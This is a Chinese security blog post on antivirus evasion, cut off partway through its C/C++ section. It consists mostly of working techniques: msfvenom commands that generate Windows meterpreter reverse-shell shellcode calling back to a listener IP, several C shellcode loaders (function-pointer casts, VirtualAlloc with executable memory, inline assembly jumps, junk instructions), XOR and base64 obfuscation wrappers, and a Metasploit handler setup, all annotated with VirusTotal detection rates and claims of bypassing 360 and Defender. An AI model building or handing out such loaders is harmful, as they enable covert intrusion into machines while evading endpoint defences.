@@ -1,0 +1,1865 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.png">
+  <link rel="icon" type="image/png" href="/img/head.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>免杀二-脚本语言免杀 - SE_Null</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>SE_Null</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-10-04 16:24" pubdate>
+        October 4, 2020 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      9.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      155
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">免杀二-脚本语言免杀</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <p>本文介绍C/C++、python、C#、powershell、go五种语言的常见的免杀方法</p>
+<a id="more"></a>
+<h2 id="1-c-c"><a href="#1-c-c" class="headerlink" title="1.c/c++"></a>1.c/c++</h2><h3 id="1-源码编译（VT-24-70，过360和微软）"><a href="#1-源码编译（VT-24-70，过360和微软）" class="headerlink" title="1.源码编译（VT:24/70，过360和微软）"></a>1.源码编译（VT:24/70，过360和微软）</h3><h4 id="1-指针执行"><a href="#1-指针执行" class="headerlink" title="1.指针执行"></a>1.指针执行</h4><p>msf生成shellcode</p>
+<pre><code class="hljs shell">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.3.28 lport=3333  -f c -o shell.c</code></pre>
+
+<p>vs2019编译生成的shellcode</p>
+<pre><code class="hljs shell">unsigned char buf[] =
+
+&quot;shellcode&quot;;
+
+<span class="hljs-meta">  #</span><span class="bash">pragma comment(linker, <span class="hljs-string">&quot;/section:.data,RWE&quot;</span>)</span>
+    main()
+    &#123;
+        ( (void(*)(void))&amp;buf)();
+    &#125;</code></pre>
+
+<p>在vs中选择debug，生成-生成project，生成的文件在debug目录下。</p>
+<p>运行生成的exe，msf设置上线即可</p>
+<pre><code class="hljs shell">use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.3.30
+set LPORT 3333</code></pre>
+
+
+
+<h4 id="2-申请动态内存加载（VT-26-69，过360）"><a href="#2-申请动态内存加载（VT-26-69，过360）" class="headerlink" title="2.申请动态内存加载（VT:26/69，过360）"></a>2.申请动态内存加载（VT:26/69，过360）</h4><p>下面的代码会申请一段动态内存，然后加载shellcode。</p>
+<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">include &lt;Windows.h&gt;</span>
+<span class="hljs-meta">#</span><span class="bash">include &lt;stdio.h&gt;</span>
+<span class="hljs-meta">#</span><span class="bash">include &lt;string.h&gt;</span>
+
+<span class="hljs-meta">#</span><span class="bash">pragma comment(linker,<span class="hljs-string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) //windows控制台程序不出黑窗口</span>
+
+unsigned char buf[] =
+&quot;shellcode&quot;;
+
+
+main()
+
+&#123;
+    char *Memory;
+
+    Memory=VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    memcpy(Memory, buf, sizeof(buf));
+
+    ((void(*)())Memory)();
+
+&#125;</code></pre>
+
+<p>操作和方法一一样。</p>
+<h4 id="3-嵌入汇编加载（VT-23-70-）"><a href="#3-嵌入汇编加载（VT-23-70-）" class="headerlink" title="3.嵌入汇编加载（VT:23/70 ）"></a>3.嵌入汇编加载（VT:23/70 ）</h4><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">include &lt;windows.h&gt;</span>
+<span class="hljs-meta">#</span><span class="bash">include &lt;stdio.h&gt;</span>
+<span class="hljs-meta">#</span><span class="bash">pragma comment(linker, <span class="hljs-string">&quot;/section:.data,RWE&quot;</span>)</span>
+unsigned char shellcode[] =&quot;&quot;;
+
+void main()
+&#123;
+
+        __asm
+    &#123;
+
+        mov eax, offset shellcode
+        jmp eax
+
+    &#125;
+&#125;</code></pre>
+
+
+
+<h4 id="4-强制类型转换"><a href="#4-强制类型转换" class="headerlink" title="4.强制类型转换"></a>4.强制类型转换</h4><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/section:.data,RWE&quot;</span>)</span>
+<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] =<span class="hljs-string">&quot;&quot;</span>;
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
+<span class="hljs-function"></span>&#123;
+   ((<span class="hljs-keyword">void</span>(WINAPI*)(<span class="hljs-keyword">void</span>))&amp;buf)();
+&#125;</code></pre>
+
+
+
+<h4 id="5-汇编花指令"><a href="#5-汇编花指令" class="headerlink" title="5.汇编花指令"></a>5.汇编花指令</h4><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/section:.data,RWE&quot;</span>)</span>
+<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellcode[] =<span class="hljs-string">&quot;&quot;</span>;
+
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
+<span class="hljs-function"></span>&#123;
+        __asm
+    &#123;
+
+        mov eax, offset shellcode
+        _emit <span class="hljs-number">0xFF</span>  
+        _emit <span class="hljs-number">0xE0</span>
+
+    &#125;
+&#125;</code></pre>
+
+
+
+<h4 id="6-XOR加密-VT-23-70"><a href="#6-XOR加密-VT-23-70" class="headerlink" title="6.XOR加密(VT:23/70 )"></a>6.XOR加密(VT:23/70 )</h4><p>msf生成raw格式的shellcode</p>
+<pre><code class="hljs shell">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.3.30 lport=3333  -f raw &gt; shellcode.raw</code></pre>
+
+<p>在<code>ShellcodeWrapper</code>文件夹中执行下面命令，其中<code>/root/shellcode.raw</code>为msf生成的raw文件，<code>se_nell</code>为自己设置的key。</p>
+<pre><code class="hljs shell">python shellcode_encoder.py -cpp /root/shellcode.raw se_null xor</code></pre>
+
+<p>在vs2019中将上述几个实验的源码打开，源文件下的test.c改为test.cpp，粘贴<code>ShellcodeWrapper</code>生成的cpp文件，位置在<code>ShellcodeWrapper/ShellcodeWrapper/result/</code>下，debug生成project，执行即可，msf可上线，但是会出现弹窗。（注意生成的cpp文件第一行<code>#include &quot;stdafx.h&quot;</code>删除再生成project文件。）</p>
+<h4 id="7-base64加密法"><a href="#7-base64加密法" class="headerlink" title="7.base64加密法"></a>7.base64加密法</h4><p><strong>方法一</strong></p>
+<p>msf生成base64编码的shellcode</p>
+<pre><code class="hljs shell">msfvenom -p  windows/meterpreter/reverse_tcp --encrypt base64  lhost=192.168.3.30 lport=3333  -f c &gt; shell.c</code></pre>
+
+<p>将<code>shell.c</code>的内容复制到一下文件中，命名为<code>shellcode.c</code></p>
+<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">include &lt;Windows.h&gt;</span>
+<span class="hljs-meta">#</span><span class="bash">include &lt;stdio.h&gt;</span>
+<span class="hljs-meta">#</span><span class="bash">include &lt;string.h&gt;</span>
+
+<span class="hljs-meta">#</span><span class="bash">include <span class="hljs-string">&quot;base64.h&quot;</span></span>
+
+unsigned char buf[] =
+&quot;msf base64 code here&quot;;
+
+int main(int argc, const char * argv[]) &#123;
+
+
+    char str1[1000] = &#123; 0 &#125;;
+    Base64decode(str1, buf);
+
+    //printf(&quot;%d  &quot;, sizeof(str3));
+    char *Memory;
+    Memory = VirtualAlloc(NULL, sizeof(str1), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(Memory, str1, sizeof(str1));
+    ((void(*)())Memory)();
+    return 0;
+&#125;</code></pre>
+
+<p>另外需准备base64.c文件，内容如下</p>
+<pre><code class="hljs shell">/* Base64 encoder/decoder. Originally Apache file ap_base64.c
+*/
+
+<span class="hljs-meta">#</span><span class="bash">include &lt;string.h&gt;</span>
+
+<span class="hljs-meta">#</span><span class="bash">include <span class="hljs-string">&quot;base64.h&quot;</span></span>
+
+/* aaaack but it&#x27;s fast and const should make it shared text page. */
+static const unsigned char pr2six[256] =
+&#123;
+    /* ASCII table */
+    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,
+    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,
+    64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
+    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,
+    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
+    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,
+    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64
+&#125;;
+
+int Base64decode_len(const char *bufcoded)
+&#123;
+    int nbytesdecoded;
+    register const unsigned char *bufin;
+    register int nprbytes;
+
+    bufin = (const unsigned char *)bufcoded;
+    while (pr2six[*(bufin++)] &lt;= 63);
+
+    nprbytes = (bufin - (const unsigned char *)bufcoded) - 1;
+    nbytesdecoded = ((nprbytes + 3) / 4) * 3;
+
+    return nbytesdecoded + 1;
+&#125;
+
+int Base64decode(char *bufplain, const char *bufcoded)
+&#123;
+    int nbytesdecoded;
+    register const unsigned char *bufin;
+    register unsigned char *bufout;
+    register int nprbytes;
+
+    bufin = (const unsigned char *)bufcoded;
+    while (pr2six[*(bufin++)] &lt;= 63);
+    nprbytes = (bufin - (const unsigned char *)bufcoded) - 1;
+    nbytesdecoded = ((nprbytes + 3) / 4) * 3;
+
+    bufout = (unsigned char *)bufplain;
+    bufin = (const unsigned char *)bufcoded;
+
+    while (nprbytes &gt; 4) &#123;
+        *(bufout++) =
+            (unsigned char)(pr2six[*bufin] &lt;&lt; 2 | pr2six[bufin[1]] &gt;&gt; 4);
+        *(bufout++) =
+            (unsigned char)(pr2six[bufin[1]] &lt;&lt; 4 | pr2six[bufin[2]] &gt;&gt; 2);
+        *(bufout++) =
+            (unsigned char)(pr2six[bufin[2]] &lt;&lt; 6 | pr2six[bufin[3]]);
+        bufin += 4;
+        nprbytes -= 4;
+    &#125;
+
+    /* Note: (nprbytes == 1) would be an error, so just ingore that case */
+    if (nprbytes &gt; 1) &#123;
+        *(bufout++) =
+            (unsigned char)(pr2six[*bufin] &lt;&lt; 2 | pr2six[bufin[1]] &gt;&gt; 4);
+    &#125;
+    if (nprbytes &gt; 2) &#123;
+        *(bufout++) =
+            (unsigned char)(pr2six[bufin[1]] &lt;&lt; 4 | pr2six[bufin[2]] &gt;&gt; 2);
+    &#125;
+    if (nprbytes &gt; 3) &#123;
+        *(bufout++) =
+            (unsigned char)(pr2six[bufin[2]] &lt;&lt; 6 | pr2six[bufin[3]]);
+    &#125;
+
+    *(bufout++) = &#x27;\0&#x27;;
+    nbytesdecoded -= (4 - nprbytes) &amp; 3;
+    return nbytesdecoded;
+&#125;
+
+static const char basis_64[] =
+&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;
+
+int Base64encode_len(int len)
+&#123;
+    return ((len + 2) / 3 * 4) + 1;
+&#125;
+
+int Base64encode(char *encoded, const char *string, int len)
+&#123;
+    int i;
+    char *p;
+
+    p = encoded;
+    for (i = 0; i &lt; len - 2; i += 3) &#123;
+        *p++ = basis_64[(string[i] &gt;&gt; 2) &amp; 0x3F];
+        *p++ = basis_64[((string[i] &amp; 0x3) &lt;&lt; 4) |
+            ((int)(string[i + 1] &amp; 0xF0) &gt;&gt; 4)];
+        *p++ = basis_64[((string[i + 1] &amp; 0xF) &lt;&lt; 2) |
+            ((int)(string[i + 2] &amp; 0xC0) &gt;&gt; 6)];
+        *p++ = basis_64[string[i + 2] &amp; 0x3F];
+    &#125;
+    if (i &lt; len) &#123;
+        *p++ = basis_64[(string[i] &gt;&gt; 2) &amp; 0x3F];
+        if (i == (len - 1)) &#123;
+            *p++ = basis_64[((string[i] &amp; 0x3) &lt;&lt; 4)];
+            //    *p++ = &#x27;=&#x27;;
+        &#125;
+        else &#123;
+            *p++ = basis_64[((string[i] &amp; 0x3) &lt;&lt; 4) |
+                ((int)(string[i + 1] &amp; 0xF0) &gt;&gt; 4)];
+            *p++ = basis_64[((string[i + 1] &amp; 0xF) &lt;&lt; 2)];
+        &#125;
+        //*p++ = &#x27;=&#x27;;
+    &#125;
+
+    *p++ = &#x27;\0&#x27;;
+    return p - encoded;
+&#125;</code></pre>
+
+<p><code>base64.h</code>文件内容</p>
+<pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> _BASE64_H_</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _BASE64_H_</span>
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __cplusplus</span>
+<span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;
+<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
+
+    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Base64encode_len</span><span class="hljs-params">(<span class="hljs-keyword">int</span> len)</span></span>;
+    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Base64encode</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * coded_dst, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *plain_src, <span class="hljs-keyword">int</span> len_plain_src)</span></span>;
+
+    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Base64decode_len</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> * coded_src)</span></span>;
+    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Base64decode</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * plain_dst, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *coded_src)</span></span>;
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __cplusplus</span>
+&#125;
+<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">//_BASE64_H_</span></span></code></pre>
+
+<p>使用gcc进行编译</p>
+<pre><code class="hljs shell">gcc shellcode.c base64.c -o test.exe</code></pre>
+
+<p>执行exe可正常上线</p>
+<p><strong>方法二</strong></p>
+<p>与方法一略有不同</p>
+<p>base64.c</p>
+<pre><code class="hljs angelscript"><span class="hljs-comment">//</span>
+<span class="hljs-comment">//  base64.c</span>
+<span class="hljs-comment">//  base64</span>
+<span class="hljs-comment">//</span>
+<span class="hljs-comment">//  Created by guofu on 2017/5/25.</span>
+<span class="hljs-comment">//  Copyright © 2017年 guofu. All rights reserved.</span>
+<span class="hljs-comment">//</span>
+<span class="hljs-comment">/**</span>
+<span class="hljs-comment">*  转解码过程</span>
+<span class="hljs-comment">*  3 * 8 = 4 * 6; 3字节占24位, 4*6=24</span>
+<span class="hljs-comment">*  先将要编码的转成对应的ASCII值</span>
+<span class="hljs-comment">*  如编码: s 1 3</span>
+<span class="hljs-comment">*  对应ASCII值为: 115 49 51</span>
+<span class="hljs-comment">*  对应二进制为: 01110011 00110001 00110011</span>
+<span class="hljs-comment">*  将其6个分组分4组: 011100 110011 000100 110011</span>
+<span class="hljs-comment">*  而计算机是以8bit存储, 所以在每组的高位补两个0如下:</span>
+<span class="hljs-comment">*  00011100 00110011 00000100 00110011对应:28 51 4 51</span>
+<span class="hljs-comment">*  查找base64 转换表 对应 c z E z</span>
+<span class="hljs-comment">*</span>
+<span class="hljs-comment">*  解码</span>
+<span class="hljs-comment">*  c z E z</span>
+<span class="hljs-comment">*  对应ASCII值为 99 122 69 122</span>
+<span class="hljs-comment">*  对应表base64_suffix_map的值为 28 51 4 51</span>
+<span class="hljs-comment">*  对应二进制值为 00011100 00110011 00000100 00110011</span>
+<span class="hljs-comment">*  依次去除每组的前两位, 再拼接成3字节</span>
+<span class="hljs-comment">*  即: 01110011 00110001 00110011</span>
+<span class="hljs-comment">*  对应的就是s 1 3</span>
+<span class="hljs-comment">*/</span>
+
+#include <span class="hljs-string">&quot;base64.h&quot;</span>
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+<span class="hljs-comment">// base64 转换表, 共64个</span>
+static <span class="hljs-keyword">const</span> char base64_alphabet[] = &#123;
+    <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>,
+    <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>,
+    <span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>,
+    <span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;Z&#x27;</span>,
+    <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>,
+    <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>,
+    <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>,
+    <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;z&#x27;</span>,
+    <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>,
+    <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span> &#125;;
+
+<span class="hljs-comment">// 解码时使用</span>
+static <span class="hljs-keyword">const</span> unsigned char base64_suffix_map[<span class="hljs-number">256</span>] = &#123;
+    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">253</span>, <span class="hljs-number">255</span>,
+    <span class="hljs-number">255</span>, <span class="hljs-number">253</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,
+    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">253</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,
+    <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,  <span class="hljs-number">62</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,  <span class="hljs-number">63</span>,
+    <span class="hljs-number">52</span>,  <span class="hljs-number">53</span>,  <span class="hljs-number">54</span>,  <span class="hljs-number">55</span>,  <span class="hljs-number">56</span>,  <span class="hljs-number">57</span>,  <span class="hljs-number">58</span>,  <span class="hljs-number">59</span>,  <span class="hljs-number">60</span>,  <span class="hljs-number">61</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,
+    <span class="hljs-number">255</span>, <span class="hljs-number">254</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">2</span>,   <span class="hljs-number">3</span>,   <span class="hljs-number">4</span>,   <span class="hljs-number">5</span>,   <span class="hljs-number">6</span>,
+    <span class="hljs-number">7</span>,   <span class="hljs-number">8</span>,   <span class="hljs-number">9</span>,  <span class="hljs-number">10</span>,  <span class="hljs-number">11</span>,  <span class="hljs-number">12</span>,  <span class="hljs-number">13</span>,  <span class="hljs-number">14</span>,  <span class="hljs-number">15</span>,  <span class="hljs-number">16</span>,  <span class="hljs-number">17</span>,  <span class="hljs-number">18</span>,
+    <span class="hljs-number">19</span>,  <span class="hljs-number">20</span>,  <span class="hljs-number">21</span>,  <span class="hljs-number">22</span>,  <span class="hljs-number">23</span>,  <span class="hljs-number">24</span>,  <span class="hljs-number">25</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>,
+    <span class="hljs-number">255</span>,  <span class="hljs-number">26</span>,  <span class="hljs-number">27</span>,  <span class="hljs-number">28</span>,  <span class="hljs-number">29</span>,  <span class="hljs-number">30</span>,  <span class="hljs-number">31</span>,  <span class="hljs-number">32</span>,  <span class="hljs-number">33</span>,  <span class="hljs-number">34</span>,  <span class="hljs-number">35</span>,  <span class="hljs-number">36</span>,
+    <span class="hljs-number">37</span>,  <span class="hljs-number">38</span>,  <span class="hljs-number">39</span>,  <span class="hljs-number">40</span>,  <span class="hljs-number">41</span>,  <span class="hljs-number">42</span>,  <span class="hljs-number">43</span>,  <span class="hljs-number">44</span>,  <span class="hljs-number">45</span>,  <span class="hljs-number">46</span>,  <span class="hljs-number">47</span>,  <span class="hljs-number">48</span>,
